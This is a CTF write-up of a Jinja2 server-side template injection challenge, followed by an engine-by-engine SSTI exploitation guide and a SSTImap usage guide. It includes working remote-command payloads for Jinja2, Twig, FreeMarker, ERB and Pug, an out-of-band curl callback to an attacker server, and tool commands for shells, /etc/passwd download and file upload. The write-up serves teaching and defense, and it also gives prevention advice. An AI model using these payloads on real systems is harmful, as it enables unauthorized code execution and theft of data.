# SSTI1 — CTF Writeup

| | |
|---|---|
| **Challenge** | SSTI1 |
| **Category** | Web Exploitation — Easy |
| **Vulnerability** | Server-Side Template Injection (SSTI) |

---

## Initial clue

The challenge description mentioned **templating** and gave a page where I could submit an
announcement that got displayed back. That raised the core question:

```
Is my input being treated as normal data?
                OR
Is my input being interpreted as template code?
```

---

## Enumeration

**1. Submit normal input**

Submitted `hello` — it was reflected back on the `/announce` page, confirming my input was
reaching the application and appearing in the response.

**2. Inspect the HTTP request/response**

Using the browser's DevTools → Network tab:

```
POST /  →  307 Temporary Redirect  →  Location: /announce
```

A `307 Temporary Redirect` just means "the resource is temporarily at another URL" (given by
the `Location` header). It's not a vulnerability by itself — just a routing detail worth
understanding while enumerating.

**3. Test for template evaluation**

Given the "templating" hint and the reflected input, I tried a basic Jinja2 arithmetic
expression:

```
Input:               {{7*7}}
Expected (safe):     {{7*7}}
Actual (vulnerable): 49
```

Getting `49` back proved the server was **evaluating** the input rather than displaying it
→ **SSTI confirmed**, engine identified as **Jinja2** (Python).

---

## Exploit

Once SSTI was confirmed, the goal was to walk from a Jinja2 object → a Python object → the
`os` module → command execution.

**Final payload:**

```jinja2
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}
```

**Breaking the chain down:**

| Step | Piece                          | What it does                                                                        |
|:-----|:-------------------------------|:------------------------------------------------------------------------------------|
| 1    | `self`                         | Entry point — refers to the current template reference object                       |
| 2    | `._TemplateReference__context` | Reaches the internal rendering context of the template                              |
| 3    | `.cycler`                      | A Jinja2-provided helper object — used purely as a stepping stone to a Python object |
| 4    | `.__init__`                    | Grabs the object's constructor — a plain Python **function object**                 |
| 5    | `.__globals__`                 | Every Python function carries a reference to its own module's global namespace      |
| 6    | `.os`                          | The `os` module happened to be sitting in that namespace — the bridge into the OS   |
| 7    | `.popen('ls')`                 | Runs the shell command `ls`, returning a pipe to its output                         |
| 8    | `.read()`                      | Reads that output back into the template response                                   |

> The exact object path (`cycler` here) isn't the important part. What matters is the
> general technique: find *any* Python object reachable from the template → walk to
> `__init__.__globals__` → land in a module namespace → find `os` (or an equivalent) →
> execute commands. Different environments expose different starting objects, so this
> chain gets adapted, not memorized — see the general guide below.

**Flag retrieval:**

```bash
ls          # enumerate the directory instead of guessing paths
cat flag    # read the flag once located
```

---

## Tools

- Browser DevTools (Network tab)
- Jinja2 / Python knowledge
- Linux terminal (`ls`, `cat`)

---

## What I learned

### Web fundamentals

- How input flows from browser → server → response
- What `POST`, `307 Temporary Redirect`, and the `Location` header mean
- Why *reflected input* is a useful signal during enumeration
- Using DevTools to inspect requests/responses

### SSTI

- SSTI is a vulnerability *class*, not tied to one template engine
- `{{7*7}}` → `49` is the classic first test for Jinja2-style engines
- Severity depends heavily on what the template context exposes

### Jinja2 / Python

- `{{ }}` expressions, `{% %}` statements, `{# #}` comments
- Any Python object can expose more objects via attributes/methods
- Function objects carry `__globals__`, pointing at their module's namespace — a powerful
  pivot point
- `os.popen(cmd).read()` executes a shell command and captures its output

### Methodology (the real takeaway)

```
Find user input → Trace where it goes → Test for template evaluation
→ Confirm SSTI → Identify the engine → Learn its syntax & context
→ Find reachable objects → Reach the language runtime → Reach the OS
→ Achieve the objective
```

---

## Why the vulnerability existed

The application let attacker-controlled input become part of the **template source** that
Jinja2 compiles and evaluates, instead of passing it in only as a **template variable**.

```
Unsafe:  Template Source + User Input  →  Jinja2 evaluates it as code
Safe:    Template + {{ user_input }}   →  Jinja2 renders it as inert data
```

In Flask/Jinja2 terms, this is the difference between:

```python
# Vulnerable — user input becomes template source
return render_template_string(user_input)

# Safe — user input is only ever a variable, never source
return render_template("page.html", announcement=user_input)
```

---

## How to prevent it

1. **Never build templates from untrusted input** — don't concatenate/format user data
   into the template string itself.
2. **Pass user input only as a rendering variable**, never through
   `render_template_string()`/`eval()`-style dynamic compilation with attacker data inside.
3. **Use the framework's standard, safe rendering APIs** instead of dynamic template
   compilation.
4. **Sandbox/restrict the template environment** if dynamic templates are unavoidable —
   don't expose Python internals, `os`, `subprocess`, or other sensitive globals to the
   render context (note: even Jinja2's "sandboxed" mode has had documented escapes, so
   treat it as risk-reduction, not a guarantee).
5. **Don't rely on blocklisting strings** like `{{7*7}}`. There are countless equivalent
   payloads/encodings — blocking one string is not a fix.
6. **Maintain strict code/data separation** — trusted template = code, user input = data,
   and the two must never merge.

---
---

# 📘 Additional Material — General Guide to Finding & Exploiting SSTI

*This section is engine-agnostic. Use it whenever you hit a target and don't yet know
whether it's Jinja2, or something else entirely.*

---

## 1. How to detect SSTI in the first place

Find any place user input gets reflected back into a rendered page (names, comments,
search boxes, error messages, PDF/report generators, email templates, "preview" features)
and try a **polyglot payload** that means something different in several engines at once:

```
${7*7}
${{7*7}}
{{7*7}}
{{7*'7'}}
#{7*7}
<%= 7*7 %>
{{7*7}}[[5*5]]
${{<%[%'"}}%\.
```

Interpretation of results:

> **`49`**
> Numeric expression evaluated → likely SSTI
>
> **`7777777`** (string repeated)
> Python-family engine evaluated `7*'7'` as string multiplication → strongly suggests **Jinja2/Mako**
>
> **Literal payload reflected unchanged**
> Probably not vulnerable (or output is being encoded)
>
> **Error message / stack trace**
> Still useful — often **leaks the engine name and version** directly
>
> **Blank / 500 error**
> Could be a crash from malformed syntax — try engine-specific syntax next

**Always check error pages.** Template engines are notoriously chatty when a payload
breaks their parser — a stack trace often just tells you "Jinja2" or "Twig" outright.

---

## 2. Fingerprinting the engine

Once you know it's SSTI, narrow down *which* engine using syntax-specific probes:

| Engine     | Language | Detection payload                | Notes              |
|:-----------|:---------|:---------------------------------|:-------------------|
| Jinja2     | Python   | `{{7*7}}` → `49`                | Very common in Flask apps |
| Mako       | Python   | `${7*7}` → `49`                 |                    |
| Twig       | PHP      | `{{7*'7'}}` → `49` (string coerced to int) | Common in Symfony  |
| Smarty     | PHP      | `{7*7}` → `49`                  |                    |
| FreeMarker | Java     | `<#assign x=7*7>${x}` → `49`    |                    |
| Velocity   | Java     | `#set($x=7*7)$x` → `49`         |                    |
| ERB        | Ruby     | `<%= 7*7 %>` → `49`             | Common in Rails    |
| Pug        | Node.js  | `#{7*7}` → `49`                 |                    |
| EJS        | Node.js  | `<%= 7*7 %>` → `49`             |                    |

If the numeric multiplication is ambiguous between engines, the **string-multiplication
trick** (`7*'7'`) is the classic disambiguator: Python-based engines (Jinja2, Mako) return
`'7777777'`, while most others error out or ignore it.

---

## 3. General exploitation strategy (works across engines)

Regardless of engine, the escalation path is always conceptually the same:

```
Template Expression Evaluation
        ↓
Objects exposed by the Template Engine
        ↓
Objects/Functions of the Underlying Language
        ↓
Language's OS/Process Interface
        ↓
Command Execution
```

So the real skill isn't "know the Jinja2 payload" — it's:

1. Confirm what language the engine runs on (Python, Java, PHP, Ruby, JS...).
2. Learn how *that language* exposes "reach anything from any object" tricks
   (`__globals__`/MRO tricks in Python, `Runtime.getRuntime()` in Java,
   `system()`/`shell_exec()` in PHP, `` `command` ``/`system()` in Ruby, `require('child_process')` in Node).
3. Find *any* object reachable from the template context that belongs to that language
   (not user-defined) and pivot through it to reach that language's command-execution
   primitive.
4. If the engine sandboxes dangerous built-ins, look for known **sandbox escapes** for
   that specific engine/version (these are well documented for Jinja2's `SandboxedEnvironment`,
   Twig's sandbox, etc.).

### Jinja2 (Python) — other common payload families

Different environments expose different "any object" starting points if `self` or
`cycler` aren't available. Common alternatives:

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[<index of subprocess.Popen>]('id',shell=True,stdout=-1).communicate() }}
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
{{ lipsum.__globals__.os.popen('id').read() }}
{{ config.items() }}   # sometimes leaks secrets directly, no RCE needed
```

The `__subclasses__()` trick works because **every** Python object ultimately inherits
from `object`, so walking its subclasses eventually surfaces something like
`subprocess.Popen` — even with no obvious `os` reference nearby.

### Twig (PHP)

```twig
{{ ['id'] | filter('system') }}
{{ ['id', '', ['/bin/sh', '-c']] | reduce('exec') }}
```

### FreeMarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Ruby ERB

```erb
<%= system('id') %>
<%= `id` %>
```

### Pug / EJS (Node.js)

```javascript
#{root.process.mainModule.require('child_process').execSync('id')}
```

---

## 4. Handling harder cases

- **Blind SSTI** (no output reflected): use out-of-band techniques — trigger a DNS/HTTP
  request to a server you control (e.g. `os.popen('curl your-server.com')`) via Burp
  Collaborator or a similar OOB listener, then confirm execution by watching for the hit.
- **WAF/filter bypass:** attribute access can be written without dots using
  `|attr('__class__')` (Jinja2 filter syntax), string concatenation, or Unicode
  normalization tricks, when `.` or `_` characters are being stripped.
- **Sandboxed environments:** search for the engine name + "sandbox escape" — these are
  usually specific CVEs/gadget chains rather than something to derive from scratch.

---

## 5. Useful automation

- **[tplmap](https://github.com/epinna/tplmap)** — automates SSTI detection and
  exploitation across many engines, similar in spirit to `sqlmap` for SQLi.
- **[PayloadsAllTheThings – SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)**
  — the most complete community-maintained payload list.
- **[HackTricks – SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)**
  — engine-by-engine cheatsheets and detection flowcharts.

---
---

# 🎯 How to Actually Get Good at This (not just pass CTFs)

Solving one challenge with a working payload is progress, but it's fair that it doesn't
build the underlying skill on its own. Here's a path to actually understand *why* these
payloads work, so you can build a new one from scratch on a target you've never seen:

1. **Learn Python's object model properly first.** SSTI-on-Jinja2 is really "Python object
   introspection abuse" wearing a template-engine costume. Spend time understanding:
   `__class__`, `__mro__`, `__subclasses__()`, `__init__`, `__globals__`, `__builtins__`.
   Play with these in a plain Python REPL with no Jinja2 involved at all until the chain
   stops feeling like magic.
2. **Build a deliberately vulnerable Flask app yourself.** Write a 10-line Flask route
   that does `render_template_string(request.args.get('name'))`, run it locally, and
   attack your own app. Building the vulnerable side makes the attacker side click.
3. **Do the same exercise for one non-Python engine** (e.g. a tiny Node/EJS or PHP/Twig
   app). This is what generalizes "SSTI" from "a Jinja2 trick" into "a class of
   vulnerability" for you.
4. **Work through structured labs, in this order:**
   - [PortSwigger Web Security Academy – Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
     (free, has guided labs with explanations — the single best starting point)
   - HackTricks SSTI page (above) as a reference while doing the labs
   - PicoCTF / TryHackMe / HackTheBox web-exploitation tracks for more SSTI challenges
     across different engines, not just Jinja2
5. **Re-solve SSTI1 from memory, without your notes**, a few days from now. If you can
   rebuild the whole chain (detect → fingerprint → find an object path → escalate) without
   looking anything up, the concept has actually landed.
6. **Read a couple of real-world SSTI disclosure writeups** (search "SSTI" on HackerOne
   disclosed reports or CVE databases) — seeing it in a real, messier app (not a clean CTF)
   is what teaches you to *recognize* the vulnerability pattern in the wild, which is a
   different skill from exploiting a known-vulnerable lab.

The honest short version: **do the PortSwigger labs next** — they're free, they cover
multiple engines, and each lab explains the "why" instead of just handing you a payload.
That will do more for you than another five easy Jinja2 CTFs.


---
---

# 🤖 Additional Material — SSTImap Detection & Exploitation Guide

*I also used the SSTImap auto exploitation tool. Here is the documentation:*

## What is SSTImap?

SSTImap is an automated tool for detecting and exploiting Server-Side Template Injection (SSTI) vulnerabilities. It is based on Tplmap and supports multiple template engines and programming languages.

It can automate:
- SSTI detection
- Template engine identification
- Injection-point detection
- Template evaluation
- Programming-language code evaluation
- Operating-system command execution
- File reading, writing, uploading, and downloading
- Bind and reverse shells

For CTFs, SSTImap is useful for automating repetitive SSTI testing.

---

## Installation

**1. Clone SSTImap**
```bash
cd ~/git_projects
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
```

**2. Check Python**
```bash
python3 --version
```

**3. Create a Virtual Environment**
Kali Linux uses PEP 668, which can prevent installing Python packages directly into the system Python environment.

Install the required packages:
```bash
sudo apt update
sudo apt install python3-venv python3-full -y
```

Create a virtual environment and activate it:
```bash
python3 -m venv venv
source venv/bin/activate
```
The terminal should now show `(venv)`.

**4. Install requirements and test**
```bash
pip install -r requirements.txt
python3 sstimap.py -h
```

---

## Basic Usage

The basic syntax is:
```bash
python3 sstimap.py -u "TARGET_URL"
```

Example:
```bash
python3 sstimap.py -u "http://example.com/"
```
SSTImap will attempt to identify injectable parameters and template engines.

### GET Parameters

If the application uses a GET parameter (e.g., `http://example.com/?name=hello`), run:
```bash
python3 sstimap.py -u "http://example.com/?name=hello"
```
SSTImap will test the `name` parameter.

### POST Parameters

If the application receives data through a POST request (e.g., `content=hello`), use the `-d` option to supply POST data:
```bash
python3 sstimap.py -u "http://example.com/" -d "content=hello"
```

For SSTI1, the vulnerable parameter was `content`, so the following command was used:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello"
```
SSTImap then detected:
```text
POST data type detected as 'Form'
Testing if Body parameter 'content' is injectable
```

---

## Finding the Correct Parameter

If SSTImap reports:
> *Tested parameters appear to be not injectable.*

do not immediately assume there is no SSTI. The request may not be configured correctly. 

Use your Browser's Developer Tools to inspect the exact request being made:
`Browser → Developer Tools → Network → Submit the form → Open POST request → Inspect Payload / Form Data`

The important idea is to give SSTImap the exact same request structure that the application expects.

---

## Manual SSTI Confirmation

Before using an automated tool, understand the manual test. For Jinja2, a common test is `{{7*7}}`. If the application returns `49` instead of `{{7*7}}`, then the server is evaluating template expressions:

`{{7*7}}  →  Template Engine  →  7 × 7  →  49`

This is how SSTI1 was manually confirmed.

---

## Detecting the Template Engine

SSTImap can test multiple template engines. You may see it cycle through: `Velocity`, `OGNL`, `Freemarker`, `Twig`, `Nunjucks`, `Jinja2`, etc.

If you do not know the template engine, testing multiple engines is useful:
`Unknown Template Engine → Test Different Engines → Successful Payload → Identify Engine`

### Forcing a Known Engine

If you already know the application uses Jinja2, you can tell SSTImap to focus on Jinja2, which is faster and reduces unnecessary requests:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2
```
This is an example of using information gained during enumeration to make automated testing more efficient.

---

## Understanding SSTImap Detection Results

A successful scan may show:
```text
[+] Jinja2 plugin has confirmed injection with tag '*'
[+] SSTImap identified the following injection point:

  Body parameter: content
  Engine: Jinja2
  Injection: *
  Context: text
  OS: posix-linux
  Technique: rendered
```

- **Body parameter (`content`)**: The vulnerable input is in the HTTP request body.
- **Engine (`Jinja2`)**: The template engine was identified as Jinja2.
- **Injection (`*`)**: SSTImap's injection marker is being inserted at that location during testing.
- **Context (`text`)**: The input is being processed in a text/template context.
- **OS (`posix-linux`)**: The target appears to be running a POSIX/Linux environment.
- **Technique (`rendered`)**: SSTImap detected the injection through differences in rendered output.

### Capabilities

SSTImap may report capabilities like:
```text
Capabilities:
  Shell command execution: ok
  Bind and reverse shell: ok
  File write: ok
  File read: ok
  Code evaluation: ok, python code
```
This tells you what exploitation capabilities SSTImap was able to establish. For example, `Shell command execution: ok` means OS commands can potentially be executed.

---

## Interactive Mode

SSTImap can be run interactively:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2 --interactive
```
You will see a prompt like `SSTImap (TARGET)>`. This is SSTImap's own command interface (not the normal Kali shell). 

Inside SSTImap, type `help` to show available commands. Important commands include: `opt`, `info`, `run`, `engine`, `data`, `injection_points`, `tpl`, `eval`, `os`, `os_cmd`, `upload`, `download`.

### Interactive Options

| Command | Description |
|:---|:---|
| `opt` | Display current SSTImap options (Target URL, POST data, Engine, etc.) |
| `info` | Display detection results |
| `run` / `test` / `check` | Run SSTI detection |
| `engine python/jinja2` | Set the template engine to focus on |
| `data content=hello` | Set POST data interactively |

---

## Exploitation Commands

### OS Command Execution

In normal command-line mode:
```bash
python3 sstimap.py -u "http://TARGET/" -d "content=hello" --os-cmd
```

In interactive mode, use:
```text
os_cmd COMMAND
```
For example: `os_cmd ls`, `os_cmd pwd`, `os_cmd whoami`, `os_cmd ls -la`.

### Interactive OS Shell
Inside interactive mode, typing `os` or `os_shell` will open an interactive OS shell to run multiple commands without repeatedly using `os_cmd`.

### Template Shell
Typing `tpl` or `tpl_shell` opens an interactive template-engine shell. This works directly with the template environment.
Use `tpl_code CODE` to inject code into the template engine (operates at the template-engine level, not OS level).

### Base Language Evaluation
For Jinja2, this evaluates Python code:
Use `eval` or `eval_shell` for an interactive shell, or `eval_code CODE` for a single evaluation.

### File Download
Interactive syntax: `download REMOTE LOCAL`
Example: `download /tmp/test.txt ./test.txt` (Downloads `/tmp/test.txt` from the target to `./test.txt` on your machine).

### File Upload
Syntax: `upload LOCAL REMOTE`
Example: `upload ./test.txt /tmp/test.txt` (Uploads local `./test.txt` to target's `/tmp/test.txt`).

---

## Injection Points

SSTImap can test several locations for injection:
- **Q** = Query parameters
- **B** = Body parameters
- **H** = Headers
- **C** = Cookies

Use the `injection_points` command interactively to configure these.

- **HTTP Headers**: Add with `header Header-Name: Value` (e.g., `header X-Test: hello`).
- **Cookies**: Supply with `cookie session=VALUE`.
- **HTTP Method**: Set with `method POST` or `method GET` (default is GET).

### Proxy & Crawling
- **Proxy**: SSTImap can send requests through a proxy like Burp Suite to inspect the requests it generates.
- **Crawling**: Commands like `crawl`, `forms`, `load_urls`, and `load_forms` help discover URLs and forms containing parameters.

---

## Detection Techniques

SSTImap supports four techniques:
- **R** = Rendered
- **E** = Error-based
- **B** = Boolean error-based blind
- **T** = Time-based blind

Default uses **REBT**.

- **Rendered Detection**: Application visibly displays the evaluated result (e.g. `{{7*7}}` returns `49`). This is the technique used in SSTI1.
- **Error-Based Detection**: SSTImap uses differences in errors produced when processing template expressions.
- **Boolean-Based Blind Detection**: Compares responses for different conditions (e.g. TRUE condition → Response A, FALSE condition → Response B).
- **Time-Based Blind Detection**: Relies on differences in response timing. (Note: Timing varies due to network conditions, so false positives are possible. Seeing "Blind injection timing varies too much" does not automatically mean the target is not vulnerable).

---

## SSTI1 Interactive Workflow Example

1. **Start**: `python3 sstimap.py -u "http://TARGET/" -d "content=hello" --engine python/jinja2 --interactive`
2. **Check config**: `opt`
3. **Run detection**: `run`
4. **View vulnerability**: `info`
5. **Execute command**: `os_cmd ls`
6. **Read flag**: `os_cmd cat flag`

### Normal Mode vs Interactive Mode
- **Normal Mode** (`--engine python/jinja2`): Useful for quick scans, automated testing, scripts, and one-off assessments.
- **Interactive Mode** (`--interactive`): Useful for learning, exploring, switching exploitation modes, running multiple commands, and continuing after detection.

---

## Common Mistakes

1. **Running `--os-cmd` by itself**: Bash interprets it as a Linux command. It must be appended to the SSTImap command.
2. **Confusing CLI Options With Interactive Commands**: `--os-cmd` is for normal mode, `os_cmd ls` is for interactive mode.
3. **Typing Placeholders Literally**: `download REMOTE LOCAL` is wrong. You must provide actual paths like `download /etc/passwd ./passwd.txt`.
4. **Assuming a Failed Scan Means No SSTI**: Check your URL, HTTP method, parameters, headers, cookies, etc. The tool might not be receiving the correct request format.
5. **Testing Every Engine When the Engine Is Known**: Use `--engine` to save time.
6. **Blindly Trusting Automation**: Understand what the tool is testing. False positives/negatives, connection errors, and timing problems can occur.

---

## Troubleshooting

- **PEP 668 / Externally Managed Environment**: Use a Python virtual environment to install dependencies instead of `--break-system-packages`.
- **Connection Aborted**: If you see `Error: connection aborted, bad status line`, it could be server instability, rate limiting, incompatible payload, or network issues.
- **CTF Instance Expired**: If the target URL changes, update your SSTImap command with the new URL.

---

## Recommended SSTI Workflow

1. Find user-controlled input
2. Submit normal input
3. Observe how it is reflected
4. Inspect the HTTP request
5. Test simple template expressions
6. Confirm SSTI
7. Identify the template engine
8. Use SSTImap
9. Force the known engine
10. Confirm capabilities
11. Use the minimum capability required
12. Complete the CTF objective

### Why Learn Manual SSTI Before SSTImap?

Manual testing teaches the underlying concept. For example, understanding that `{{7*7}}` returning `49` means the server evaluated your input. SSTImap simply automates the repetitive parts of this process. The most important skill is understanding why the tool succeeds, not simply knowing which command retrieves the flag.

> **Always use SSTImap only against systems you are authorized to test, such as your own lab or CTF environment.**
